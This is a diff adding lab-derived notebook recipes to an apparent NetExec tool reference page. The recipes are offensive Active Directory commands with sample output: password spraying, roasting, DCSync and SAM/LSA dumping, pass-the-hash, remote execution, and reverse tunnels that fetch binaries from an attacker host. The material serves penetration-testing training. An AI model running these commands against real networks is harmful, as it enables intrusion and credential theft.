@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=netexec) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -24,8 +26,1099 @@ nxc mssql TARGET_IP -u USER -p 'PASSWORD'
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=netexec)
+## Notebook recipes
 
-## Learning and original examples
+67 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [NetExec: Authentication and Enumeration](/tools/netexec)
+<AccordionGroup>
+
+<Accordion title="AS-REP Roasting: Quick Reference">
+
+### AS-REP Roasting: Quick Reference
+
+**AS-REP Roasting: Quick Reference**
+
+```bash
+# Linux (Impacket) — with a userlist (no creds) or authenticated
+GetNPUsers.py $DOMAIN/ -dc-ip $DC -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
+GetNPUsers.py $DOMAIN/USER:PASS -dc-ip $DC -request         # authenticated: find them all
+nxc ldap $DC -u USER -p PASS --asreproast asrep.hash
+```
+
+</Accordion>
+
+<Accordion title="10. Domain compromise (DCSync)">
+
+### 10. Domain compromise (DCSync)
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# Q1 — the Administrator NTLM hash
+proxychains impacket-secretsdump 'nexura.htb/stom:calves-warp-learning1'@172.16.119.11 -just-dc-user Administrator
+#   -> Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTHASH>:::
+
+# full domain (krbtgt = Golden Ticket persistence, + every account)
+proxychains impacket-secretsdump 'nexura.htb/stom:calves-warp-learning1'@172.16.119.11
+proxychains nxc smb 172.16.119.11 -u stom -p 'calves-warp-learning1' --ntds
+
+# command execution on the DC (the objective)
+proxychains evil-winrm -i 172.16.119.11 -u stom -p 'calves-warp-learning1'
+# or Pass-the-Hash as Administrator:
+proxychains evil-winrm -i 172.16.119.11 -u Administrator -H <NTHASH>
+```
+
+</Accordion>
+
+<Accordion title="2. Password spraying">
+
+### 2. Password spraying
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# SSH spray (Hydra)
+hydra -L usernames.txt -p 'Texas123!@#' <DMZ_IP> ssh
+#   -> [22][ssh] login: jbetty  password: Texas123!@#
+
+# SMB spray once internal (NetExec) — ONE password across users:
+nxc smb <DC> -u usernames.txt -p 'Texas123!@#' --continue-on-success | grep '[+]'
+```
+
+**Active Directory Attack Path: Worked Lab**
+
+Context from the notebook: ⚠️  Lockout:  check policy first ( nxc smb &lt;DC> -u valid -p valid --pass-pol ). Watch  BadPW  per account; if  Account Lockout Threshold  is low, spray ONE password per reset window. We pushed  stom 's BadPW to 8 with a careless full matrix — don't.
+
+```text
+nxc smb <DC> -u valid -p valid --pass-pol
+```
+
+</Accordion>
+
+<Accordion title="6. Internal AD enumeration">
+
+### 6. Internal AD enumeration
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# valid? local admin anywhere? (look for (Pwn3d!))
+proxychains nxc smb 172.16.119.10 172.16.119.11 172.16.119.7 -u hwilliam -p 'dealer-screwed-gym1'
+# users / shares / policy
+proxychains nxc smb 172.16.119.11 -u bdavid -p '...' --users | tee users.txt
+proxychains nxc smb 172.16.119.10 -u bdavid -p '...' --shares
+proxychains nxc smb 172.16.119.10 -u bdavid -p '...' -M spider_plus     # file inventory -> ~/.nxc/.../<ip>.json
+proxychains nxc smb 172.16.119.11 -u bdavid -p '...' --pass-pol
+# roasting (Password Attacks bread-and-butter)
+proxychains nxc ldap 172.16.119.11 -u bdavid -p '...' --kerberoasting kerb.txt
+proxychains nxc ldap 172.16.119.11 -u bdavid -p '...' --asreproast asrep.txt
+# SYSVOL GPP passwords
+proxychains nxc smb 172.16.119.11 -u bdavid -p '...' -M gpp_password
+# BloodHound (see the dedicated BloodHound cheatsheet)
+proxychains bloodhound-python -u bdavid -p '...' -d nexura.htb -ns 172.16.119.11 -c All --zip --dns-tcp
+# fast ACL check without the GUI:
+proxychains bloodyAD --host 172.16.119.11 -d nexura.htb -u bdavid -p '...' get writable
+```
+
+</Accordion>
+
+<Accordion title="7. Cracking loot">
+
+### 7. Cracking loot
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# download just the file (nxc is reliable through the pivot):
+proxychains nxc smb 172.16.119.10 -u bdavid -p '...' --share HR --get-file 'Archive\Employee-Passwords_OLD.psafe3' ~/loot/emp.psafe3
+# crack the master password:
+pwsafe2john ~/loot/emp.psafe3 > psafe.hash
+john --format=pwsafe --wordlist=/usr/share/wordlists/rockyou.txt psafe.hash
+#   (hashcat alt: hashcat -m 5200 ~/loot/emp.psafe3 rockyou.txt)
+# open it:
+passwordsafe ~/loot/emp.psafe3      # sudo apt install -y passwordsafe
+```
+
+</Accordion>
+
+<Accordion title="Option A — chisel + proxychains (SOCKS)">
+
+### Option A — chisel + proxychains (SOCKS)
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# Kali (attacker)
+./chisel server -p 9001 --reverse
+# DMZ01 (pull binary via your http server first)
+wget http://<KALI>:8080/chisel -O /tmp/chisel && chmod +x /tmp/chisel
+/tmp/chisel client <KALI>:9001 R:1080:socks
+# Kali: /etc/proxychains4.conf  ->  socks5 127.0.0.1 1080
+proxychains nxc smb 172.16.119.11 -u user -p pass
+```
+
+</Accordion>
+
+<Accordion title="Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)">
+
+### Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# Kali
+sudo ip tuntap add user kali mode tun ligolo && sudo ip link set ligolo up
+sudo ./proxy -selfcert            # listens :11601
+# DMZ01
+./agent -connect <KALI>:11601 -ignore-cert
+# Kali (in proxy console type `start`, then add the route)
+sudo ip route add 172.16.119.0/24 dev ligolo
+# now tools work WITHOUT proxychains:
+nxc smb 172.16.119.11 -u user -p pass
+xfreerdp3 /v:172.16.119.7 /u:bdavid /p:'...' /cert:ignore
+```
+
+</Accordion>
+
+<Accordion title="Authentication / Connectivity">
+
+### Authentication / Connectivity
+
+**Active Directory Enumeration Commands**
+
+```bash
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
+    # Check whether credentials work against the DC over SMB
+
+nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
+    # Authenticate to LDAP and verify credentials
+
+nxc winrm <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
+    # Check whether the account can access WinRM
+
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --shares
+    # Enumerate SMB shares accessible to the account
+```
+
+</Accordion>
+
+<Accordion title="Groups">
+
+### Groups
+
+**Active Directory Enumeration Commands**
+
+```bash
+nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --groups
+    # Enumerate domain groups
+
+net rpc group list -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
+    # List domain groups
+
+net rpc group members '<GROUP>' -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
+    # Show members of a domain group
+
+net rpc user info <USER> -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
+    # Show the groups a domain user belongs to
+```
+
+</Accordion>
+
+<Accordion title="Quick Htb Workflow">
+
+### Quick Htb Workflow
+
+**Active Directory Enumeration Commands**
+
+```bash
+# 1. Verify credentials
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
+
+# 2. Enumerate shares
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --shares
+
+# 3. Check user information / groups
+net rpc user info <USER> -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
+
+# 4. Enumerate domain groups
+net rpc group list -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
+
+# 5. Check LDAP
+nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
+
+# 6. Look for Kerberoastable accounts
+GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
+
+# 7. Check WinRM access
+nxc winrm <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
+
+# 8. If WinRM works, connect
+evil-winrm -i <DC_IP> -u <USER> -p '<PASSWORD>'
+```
+
+</Accordion>
+
+<Accordion title="Smb">
+
+### Smb
+
+**Active Directory Enumeration Commands**
+
+```bash
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --shares
+    # List SMB shares and permissions
+
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --sessions
+    # Show active SMB sessions
+
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --loggedon-users
+    # Show users currently logged onto the target
+
+smbclient -L //<DC_IP>/ -U '<DOMAIN>/<USER>%<PASSWORD>'
+    # List available SMB shares
+
+smbclient //<DC_IP>/<SHARE> -U '<DOMAIN>/<USER>%<PASSWORD>'
+    # Connect to a specific SMB share
+```
+
+</Accordion>
+
+<Accordion title="Users">
+
+### Users
+
+**Active Directory Enumeration Commands**
+
+```bash
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --users
+    # Enumerate domain users
+
+nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --users
+    # Enumerate users through LDAP
+
+GetADUsers.py -all -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASSWORD>'
+    # Query AD for domain users
+
+net rpc user info <USER> -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
+    # Show information and group memberships for a user
+```
+
+</Accordion>
+
+<Accordion title="1. CrackMapExec (CME) / NetExec">
+
+### 1. CrackMapExec (CME) / NetExec
+
+**Active Directory Enumeration from Linux**
+
+```bash
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+```
+
+**Active Directory Enumeration from Linux**
+
+```bash
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+```
+
+**Active Directory Enumeration from Linux**
+
+```bash
+sudo crackmapexec smb <TARGET_IP> -u forend -p Klmcargo2 --loggedon-users
+```
+
+**Active Directory Enumeration from Linux**
+
+```bash
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+```
+
+</Accordion>
+
+<Accordion title="Active Directory Enumeration: Quick Reference">
+
+### Active Directory Enumeration: Quick Reference
+
+**Active Directory Enumeration: Quick Reference**
+
+```bash
+# From Linux, unauthenticated / low-priv
+nxc smb $DC -u '' -p ''                       # null session
+enum4linux-ng -A $DC
+rpcclient -U '' -N $DC -c enumdomusers
+# Authenticated sweep
+nxc smb $DC -u USER -p PASS --users --groups --shares --pass-pol
+nxc ldap $DC -u USER -p PASS --bloodhound -c all --dns-server $DC
+```
+
+</Accordion>
+
+<Accordion title="Internal password spraying from linux">
+
+### Internal password spraying from linux
+
+**Active Directory Password Spraying**
+
+```bash
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 | grep +
+```
+
+</Accordion>
+
+<Accordion title="Chisel: Quick Tunnel Reference">
+
+### Chisel: Quick Tunnel Reference
+
+**Chisel: Quick Tunnel Reference**
+
+```bash
+# Attacker = server (reverse SOCKS)
+./chisel server -p 8080 --reverse
+# Victim = client, opens a reverse SOCKS5 proxy back to you
+./chisel client ATTACKER:8080 R:socks
+# then route tools through 127.0.0.1:1080
+proxychains nxc smb 172.16.5.0/24
+```
+
+</Accordion>
+
+<Accordion title="Brute Forcing and Password Spray">
+
+### Brute Forcing and Password Spray
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
+
+SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
+SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE
+SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE
+SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE
+SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE
+SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE
+SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE
+SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE
+
+<SNIP>
+
+SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!)
+```
+
+</Accordion>
+
+<Accordion title="CrackMapExec">
+
+### CrackMapExec
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
+
+SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
+SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)
+SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
+SMB         10.10.110.17 445    WIN7BOX  nt authority\system
+```
+
+</Accordion>
+
+<Accordion title="Enumerating Logged-on Users">
+
+### Enumerating Logged-on Users
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
+
+SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
+SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
+SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
+SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
+SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
+SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
+SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
+SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
+SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
+```
+
+</Accordion>
+
+<Accordion title="Extract Hashes from SAM Database">
+
+### Extract Hashes from SAM Database
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
+
+SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
+SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
+SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
+```
+
+</Accordion>
+
+<Accordion title="Pass-the-Hash (PtH)">
+
+### Pass-the-Hash (PtH)
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
+
+SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
+SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
+```
+
+</Accordion>
+
+<Accordion title="Local credential dumping">
+
+### Local credential dumping
+
+**DCSync and Credential Dumping: Quick Reference**
+
+```bash
+# from SAM (local accounts) + LSA
+secretsdump.py -sam sam.save -system system.save LOCAL
+nxc smb $IP -u admin -H <hash> --sam --lsa
+# Windows, in memory
+mimikatz # sekurlsa::logonpasswords
+mimikatz # lsadump::sam
+```
+
+</Accordion>
+
+<Accordion title="Tools for this service">
+
+### Tools for this service
+
+**DCSync and Credential Dumping: Quick Reference**
+
+```bash
+# DCSync (Impacket) — dump the domain
+secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc
+secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc-user krbtgt   # for golden tickets
+# NetExec
+nxc smb $DC -u USER -p PASS --ntds
+```
+
+</Accordion>
+
+<Accordion title="Find Credentials in Network Shares">
+
+### Find Credentials in Network Shares
+
+**Find Credentials in Network Shares**
+
+```bash
+netexec smb <ip_target> -u <user> -p '<password>' -M spider_plus -o DOWNLOAD_FLAG=True --smb-timeout 60
+```
+
+</Accordion>
+
+<Accordion title="SMB (Port 445)">
+
+### SMB (Port 445)
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# Check credentials & auth
+nxc smb <IP> -u <user> -p '<pass>'
+
+# List shares
+nxc smb <IP> -u <user> -p '<pass>' --shares
+
+# List users
+nxc smb <IP> -u <user> -p '<pass>' --users
+
+# Browse shares interactively
+smbclient //IP/<share> -U '<user>%<pass>'
+
+# Commands inside smbclient
+ls
+cd <folder>
+get <file>
+```
+
+</Accordion>
+
+<Accordion title="WinRM (Port 5985/5986)">
+
+### WinRM (Port 5985/5986)
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# Check access
+nxc winrm <IP> -u <user> -p '<pass>'
+
+# Connect (if access granted)
+evil-winrm -i <IP> -u <user> -p '<pass>'
+
+# Pass-the-hash
+evil-winrm -i <IP> -u <user> -H <NTLM_hash>
+```
+
+</Accordion>
+
+<Accordion title="Kerberoasting: Quick Reference">
+
+### Kerberoasting: Quick Reference
+
+**Kerberoasting: Quick Reference**
+
+```bash
+# Linux (Impacket) — needs any valid domain creds
+GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request -outputfile kerb.hash
+# NetExec
+nxc ldap $DC -u USER -p PASS --kerberoasting kerb.hash
+```
+
+</Accordion>
+
+<Accordion title="Constrained (S4U)">
+
+### Constrained (S4U)
+
+**Kerberos Delegation: Quick Reference**
+
+```bash
+# You control an account with "allowed to delegate to" a service
+getST.py -spn cifs/target $DOMAIN/svc:PASS -impersonate Administrator -dc-ip $DC
+export KRB5CCNAME=Administrator.ccache
+nxc smb target -k --sam
+```
+
+</Accordion>
+
+<Accordion title="Ligolo-ng: Quick Reference">
+
+### Ligolo-ng: Quick Reference
+
+**Ligolo-ng: Quick Reference**
+
+```bash
+# In the ligolo proxy console
+session            # pick the agent
+# Then on the attacker box: add a route to the internal subnet via ligolo
+sudo ip route add 172.16.5.0/24 dev ligolo
+# now reach hosts directly
+nxc smb 172.16.5.19
+```
+
+</Accordion>
+
+<Accordion title="Locating &amp; Retrieving GPP Passwords with CrackMapExec">
+
+### Locating & Retrieving GPP Passwords with CrackMapExec
+
+**Miscellaneous Misconfigurations**
+
+```shellsession
+grcic550@htb[/htb]$ crackmapexec smb -L | grep gpp
+
+[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
+[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
+```
+
+</Accordion>
+
+<Accordion title="Using CrackMapExec&#x27;s gpp_autologin Module">
+
+### Using CrackMapExec's gpp_autologin Module
+
+**Miscellaneous Misconfigurations**
+
+```shellsession
+grcic550@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
+```
+
+</Accordion>
+
+<Accordion title="Modules">
+
+### Modules
+
+**NetExec: Authentication and Enumeration**
+
+```bash
+nxc smb $IP -u USER -p PASS -M spider_plus       # crawl shares
+nxc ldap $DC -u USER -p PASS -M maq              # MachineAccountQuota
+```
+
+</Accordion>
+
+<Accordion title="NetExec: Authentication and Enumeration">
+
+### NetExec: Authentication and Enumeration
+
+**NetExec: Authentication and Enumeration**
+
+```bash
+# spray / validate creds across a subnet
+nxc smb 172.16.5.0/24 -u USER -p PASS
+nxc smb $IP -u USER -H <nthash>                 # pass-the-hash
+# enumeration
+nxc smb $IP -u USER -p PASS --shares --users --groups --pass-pol --rid-brute
+nxc ldap $DC -u USER -p PASS --bloodhound -c all --dns-server $DC
+# dumping (needs local admin)
+nxc smb $IP -u admin -p PASS --sam --lsa --ntds
+# code exec
+nxc smb $IP -u admin -p PASS -x 'whoami'        # or -X for powershell
+```
+
+</Accordion>
+
+<Accordion title="Step 3 — DCSync the Administrator hash">
+
+### Step 3 — DCSync the Administrator hash
+
+**Pass the Certificate: PKINIT and Lab Walkthrough**
+
+```bash
+impacket-secretsdump -k -no-pass -just-dc-user Administrator -dc-ip 10.129.234.174 \
+  'INLANEFREIGHT.LOCAL/dc01$@dc01.inlanefreight.local'
+#   -> Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NThash>:::
+
+# if impacket's secretsdump errors, use netexec with the same ticket:
+nxc smb 10.129.234.174 -k --use-kcache --ntds --user Administrator
+```
+
+</Accordion>
+
+<Accordion title="NetExec — spray a hash across a subnet">
+
+### NetExec — spray a hash across a subnet
+
+**Pass the Hash from Linux and Windows**
+
+```bash
+netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+</Accordion>
+
+<Accordion title="NetExec (the multi-protocol workhorse)">
+
+### NetExec (the multi-protocol workhorse)
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+sudo apt-get -y install netexec
+netexec -h                              # general help
+netexec smb -h                          # protocol-specific options
+netexec <proto> <target> -u <user|userlist> -p <pass|passlist>
+```
+
+</Accordion>
+
+<Accordion title="Password spraying">
+
+### Password spraying
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+netexec smb 10.100.38.0/24 -u usernames.list -p 'ChangeMe123!'
+```
+
+</Accordion>
+
+<Accordion title="Remote dumping with NetExec (no manual hive copy)">
+
+### Remote dumping with NetExec (no manual hive copy)
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+netexec smb 10.129.42.198 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --sam     # dump SAM remotely
+netexec smb 10.129.42.198 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --lsa     # dump LSA secrets remotely
+```
+
+</Accordion>
+
+<Accordion title="SMB (445)">
+
+### SMB (445)
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+netexec smb 10.129.42.197 -u user -p password --shares
+smbclient -U user \\\\10.129.42.197\\SHARENAME
+```
+
+</Accordion>
+
+<Accordion title="Spray / brute-force against the DC (NetExec)">
+
+### Spray / brute-force against the DC (NetExec)
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
+```
+
+</Accordion>
+
+<Accordion title="WinRM (5985/HTTP, 5986/HTTPS)">
+
+### WinRM (5985/HTTP, 5986/HTTPS)
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+netexec winrm 10.129.42.197 -u user.list -p password.list
+```
+
+</Accordion>
+
+<Accordion title="🔁 Mutating a known OLD password (the stom case)">
+
+### 🔁 Mutating a known OLD password (the stom case)
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+# 1. base word
+echo 'fails-nibble-disturb4' > base.txt
+# 2. generate variants with rules (increment digit, toggle case, append symbol/year)
+hashcat --stdout base.txt -r /usr/share/hashcat/rules/best64.rule | sort -u > muts.txt
+# tight hand-list when lockout is a risk:
+printf '%s\n' fails-nibble-disturb5 fails-nibble-disturb6 Fails-nibble-disturb4 \
+  fails-nibble-disturb4! fails-nibble-disturb5! fails-nibble-disturb2025 fails-nibble-disturb2026 >> muts.txt
+# 3. spray the mutations (CAREFULLY — see lockout below)
+proxychains nxc smb <DC> -u <user> -p muts.txt --continue-on-success | grep '[+]'
+```
+
+</Accordion>
+
+<Accordion title="🔒 Lockout discipline (don&#x27;t lock the account)">
+
+### 🔒 Lockout discipline (don't lock the account)
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+# read the policy BEFORE spraying
+proxychains nxc smb <DC> -u <valid_user> -p '<valid_pass>' --pass-pol
+```
+
+</Accordion>
+
+<Accordion title="1. SSH port forwarding (no tools needed)">
+
+### 1. SSH port forwarding (no tools needed)
+
+**Pivoting and File Transfer: Field Reference**
+
+```bash
+# Dynamic (-D): a SOCKS proxy → reach the WHOLE subnet via proxychains
+ssh -D 1080 jbetty@<DMZ_IP>
+#   /etc/proxychains4.conf -> socks5 127.0.0.1 1080 ; then:
+proxychains nxc smb 172.16.119.11 -u user -p pass
+
+# Local (-L): map ONE internal service to a Kali local port (great for RDP)
+ssh -L 13389:172.16.119.7:3389 jbetty@<DMZ_IP>
+xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore     # no proxychains
+
+# Remote (-R): make a Kali service reachable FROM the pivot side (reverse)
+ssh -R 8000:127.0.0.1:8000 jbetty@<DMZ_IP>      # DMZ's :8000 -> Kali's :8000
+```
+
+</Accordion>
+
+<Accordion title="3. ligolo‑ng (transparent TUN — best for RDP/scanning)">
+
+### 3. ligolo‑ng (transparent TUN — best for RDP/scanning)
+
+**Pivoting and File Transfer: Field Reference**
+
+```bash
+# Kali — one-time interface setup
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+# Kali — start the proxy (listens on 11601)
+sudo ./proxy -selfcert
+# pivot host — run the agent (upload it first)
+./agent -connect <KALI_IP>:11601 -ignore-cert
+# Kali — in the ligolo console:
+session            # pick the agent
+start              # activate the tunnel
+# Kali — route the internal subnet through ligolo
+sudo ip route add 172.16.119.0/24 dev ligolo
+# now everything just works:
+nxc smb 172.16.119.11 -u user -p pass
+xfreerdp3 /v:172.16.119.7 /u:bdavid /p:'...' /cert:ignore
+nmap -sT 172.16.119.0/24
+```
+
+</Accordion>
+
+<Accordion title="Proxychains and SSH Tunnels">
+
+### Proxychains and SSH Tunnels
+
+**Proxychains and SSH Tunnels**
+
+```bash
+# /etc/proxychains4.conf  -> last line
+socks5 127.0.0.1 1080
+# use it
+proxychains -q nmap -sT -Pn 172.16.5.19
+proxychains -q nxc smb 172.16.5.0/24
+```
+
+</Accordion>
+
+<Accordion title="1. NetExec (nxc) — the workhorse">
+
+### 1. NetExec (nxc) — the workhorse
+
+**SMB Enumeration and Shares**
+
+```bash
+nxc smb <IP>                                   # banner: hostname, domain, OS, SMBv1, signing
+nxc smb <IP> -u '' -p ''                       # NULL SESSION — try first
+nxc smb <IP> -u guest -p ''                    # guest/anonymous
+nxc smb <IP> -u <user> -p '<pass>' --shares    # list shares + your READ/WRITE access on each
+nxc smb <IP> -u <user> -p '<pass>' --users     # domain/local users (build a spray list)
+nxc smb <IP> -u <user> -p '<pass>' --pass-pol  # password policy → check lockout BEFORE spraying
+nxc smb <IP> -u <user> -H <NTLM_hash> --shares # Pass-the-Hash instead of a password
+```
+
+</Accordion>
+
+<Accordion title="Validating creds &amp; spraying across hosts (NetExec)">
+
+### Validating creds & spraying across hosts (NetExec)
+
+**Windows Remote Access: RDP, WinRM, and WMI**
+
+```bash
+# Does this credential work on this protocol, and is it admin? (Pwn3d! = local admin)
+netexec winrm <IP> -u <user> -p '<pass>'
+netexec smb   <IP> -u <user> -p '<pass>'
+netexec rdp   <IP> -u <user> -p '<pass>'
+
+# Spray ONE credential across a whole subnet to find every host it works on
+netexec smb 172.16.1.0/24 -u <user> -p '<pass>'
+
+# Works with a hash instead of a password (Pass-the-Hash)
+netexec winrm <IP> -u <user> -H <NTLM_hash>
+```
+
+</Accordion>
+
+<Accordion title="NetExec command execution">
+
+### NetExec command execution
+
+**Windows remote execution by service**
+
+```bash
+# One target and one known credential; replace PASSWORD
+nxc smb 192.0.2.10 -d example.local -u administrator -p 'PASSWORD' -x 'whoami'
+```
+
+**Windows remote execution by service**
+
